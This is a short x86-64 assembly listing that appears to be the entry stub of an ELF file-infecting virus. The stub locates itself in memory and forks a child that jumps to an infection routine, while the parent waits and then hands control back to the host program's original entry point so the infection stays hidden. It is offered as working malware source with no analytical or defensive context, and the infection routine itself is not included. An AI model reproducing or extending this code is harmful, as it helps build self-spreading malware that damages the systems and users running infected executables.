section.text:
	global _start:function

_start:
	call _inject; push addr to stack

_inject:
	pop rsi; pop addr from stack
	push rdx; save register
	sub rsi, 0x5; sub call instr

	sub rsi, [rel entry_inject]
	add rsi, [rel vaddr]; rdi at the offset of the program in mem

	mov rax, 57; fork
	syscall
	cmp rax, 0
	jz _fork

_wait:; parent -> run prg
	mov rax, 61; wait
	mov rdi, 0x0
	syscall

	mov rax, rsi
	add rax, [rel entry_prg]
	sub rax, [rel vaddr]; rax at the prev entry

	pop rdx
	jmp rax

_fork:; child -> run infect
	mov rax, rsi
	add rax, [rel entry_infect]
	sub rax, [rel vaddr]
	jmp rax

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
	entry_infect dq 0x0
